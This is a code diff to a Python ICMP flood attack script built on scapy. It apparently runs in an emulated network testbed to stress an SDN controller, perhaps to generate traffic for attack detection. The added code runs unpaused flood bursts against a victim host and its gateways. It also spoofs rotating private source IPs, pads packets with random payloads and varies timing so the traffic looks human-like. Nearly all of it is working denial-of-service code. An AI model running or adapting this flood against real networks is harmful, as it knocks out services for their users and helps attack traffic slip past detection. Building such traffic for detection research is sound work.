@@ -8,7 +8,12 @@ import signal
 import logging
 import uuid
 import threading
-import psutil
+# Optional psutil import - gracefully handle if missing
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
 import random
 from scapy.all import Ether, IP, ICMP, sendp, sr1
 
@@ -94,22 +99,75 @@ def run_attack(attacker_host, victim_ip, duration):
     attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Enhanced Features: RFC 1918 IP rotation, human-like timing, protocol compliance, network delay simulation")
     attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] IP Pool Size: {len(ip_rotator.ip_pool)} source IPs from RFC 1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)")
     
-    # Test target reachability
-    try:
-        ping_start = time.time()
-        ping_reply = sr1(IP(dst=victim_ip)/ICMP(), timeout=2, verbose=0)
-        ping_time = time.time() - ping_start
-        if ping_reply and ping_reply.haslayer(ICMP):
-            icmp_type = ping_reply[ICMP].type
-            if icmp_type == 0:  # Echo Reply
-                attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} is reachable (ICMP Echo Reply: {ping_time:.3f}s)")
-            else:
-                attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} responded with ICMP type {icmp_type} (time: {ping_time:.3f}s)")
-        else:
-            attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} ICMP timeout after {ping_time:.3f}s")
-    except Exception as e:
-        attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Unable to ping target {victim_ip}: {e}")
+    # (Pre-attack reachability check removed to avoid root-namespace timeouts)
     
+    # Phase A: High-intensity stress burst (no think time) for ~30% of duration
+    stress_duration = max(1, int(duration * 0.3))
+    advanced_duration = max(1, duration - stress_duration)
+    # Split stress into host-stress and gateway-stress to exercise controller
+    stress_host = max(1, stress_duration // 2)
+    stress_gw = max(1, stress_duration - stress_host)
+    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Stress phase total: {stress_duration}s (host: {stress_host}s, gateway: {stress_gw}s), Advanced phase: {advanced_duration}s")
+
+    # Host stress burst (victim host)
+    stress_host_cmd = f"""
+import time
+from scapy.all import *
+
+def icmp_stress_host():
+    iface = '{attacker_host.intfNames()[0]}'
+    target_ip = '{victim_ip}'
+    end_ts = time.time() + {stress_host}
+    while time.time() < end_ts:
+        pkt = Ether()/IP(dst=target_ip)/ICMP()
+        sendp(pkt, iface=iface, verbose=0)
+
+icmp_stress_host()
+"""
+    stress_proc_host = attacker_host.popen(['python3', '-c', stress_host_cmd])
+    try:
+        stress_proc_host.wait(timeout=stress_host + 5)
+    except Exception:
+        try:
+            stress_proc_host.terminate()
+        except Exception:
+            pass
+    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Host stress sub-phase completed")
+
+    # Gateway stress burst (controller stress via gateway echo handling)
+    gateway_ips = ["192.168.10.1", "192.168.20.1", "192.168.30.1"]
+    gw_list_str = str(gateway_ips)
+    stress_gw_cmd = f"""
+import time, random
+from scapy.all import *
+
+def icmp_stress_gw():
+    iface = '{attacker_host.intfNames()[0]}'
+    gateways = {gw_list_str}
+    end_ts = time.time() + {stress_gw}
+    i = 0
+    while time.time() < end_ts:
+        dst = gateways[i % len(gateways)]
+        i += 1
+        pkt = Ether()/IP(dst=dst)/ICMP()
+        sendp(pkt, iface=iface, verbose=0)
+
+icmp_stress_gw()
+"""
+    stress_proc_gw = attacker_host.popen(['python3', '-c', stress_gw_cmd])
+    try:
+        stress_proc_gw.wait(timeout=stress_gw + 5)
+    except Exception:
+        try:
+            stress_proc_gw.terminate()
+        except Exception:
+            pass
+    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Gateway stress sub-phase completed")
+
+    # Reset timer for advanced phase and adjust duration
+    start_time = time.time()
+    duration = advanced_duration
+
     # Generate session pattern for realistic attack behavior
     session_pattern = timing_engine.get_session_pattern(duration_minutes=duration/60)
     current_hour = time.localtime().tm_hour
@@ -174,11 +232,18 @@ def enhanced_icmp_flood_with_rfc1918_rotation():
             else:
                 current_src_ip = ip_pool[current_ip_index]
             
-            # Create ICMP packet with rotating RFC 1918 source IP
+            # Create ICMP packet with rotating RFC 1918 source IP and random payload
             icmp_id = random.randint(1, 65535)
             icmp_seq = packet_count % 65536
             
-            packet = Ether()/IP(src=current_src_ip, dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)
+            # Add random payload to vary packet size (0-1400 bytes)
+            payload_size = random.randint(0, 1400)
+            if payload_size > 0:
+                # Generate random payload data
+                payload_data = bytes([random.randint(0, 255) for _ in range(payload_size)])
+                packet = Ether()/IP(src=current_src_ip, dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)/Raw(load=payload_data)
+            else:
+                packet = Ether()/IP(src=current_src_ip, dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)
             sendp(packet, iface=interface, verbose=0)
             
             packet_count += 1
@@ -224,7 +289,7 @@ enhanced_icmp_flood_with_rfc1918_rotation()
         
         if current_time >= next_monitor:
             # Estimate packets sent with enhanced timing considerations
-            base_rate = 25  # Realistic rate with enhanced timing
+            base_rate = random.uniform(20, 30)  # Randomized rate with enhanced timing (±20%)
             if current_phase:
                 adjusted_rate = base_rate * current_phase['intensity'] * circadian_factor * workday_factor
             else:
@@ -276,7 +341,7 @@ enhanced_icmp_flood_with_rfc1918_rotation()
     process.wait()
     
     # Calculate enhanced final statistics
-    base_rate = 25  # Enhanced timing rate
+    base_rate = random.uniform(20, 30)  # Randomized enhanced timing rate (±20%)
     effective_rate = base_rate * circadian_factor * workday_factor
     final_packets_sent = int(actual_duration * effective_rate)
     final_ip_rotations = final_packets_sent // 15  # Average rotation every 15 packets
